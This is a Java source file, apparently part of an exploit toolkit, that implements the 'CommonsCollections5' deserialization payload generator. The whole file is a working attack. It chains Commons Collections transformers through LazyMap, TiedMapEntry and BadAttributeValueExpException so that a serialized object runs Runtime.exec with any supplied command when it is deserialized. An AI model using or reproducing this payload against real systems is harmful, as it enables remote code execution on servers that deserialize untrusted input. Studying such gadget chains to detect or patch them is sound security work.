package com.exp.collections;


import com.constant.PayloadGenerator;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;


import javax.management.BadAttributeValueExpException;
import java.io.File;
import java.lang.reflect.Modifier;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 extends PayloadGenerator {
    @Override
    protected File generatorPayload(String[] cmd) {
        BadAttributeValueExpException attributeValueExpException = new BadAttributeValueExpException(null);
        Map innerMap = new HashMap();
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{cmd})});
        Map map = LazyMap.decorate(innerMap,chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map,"1");
        setValueByField("val",attributeValueExpException,tiedMapEntry, Modifier.PRIVATE);
        return serializable(attributeValueExpException);
    }
}
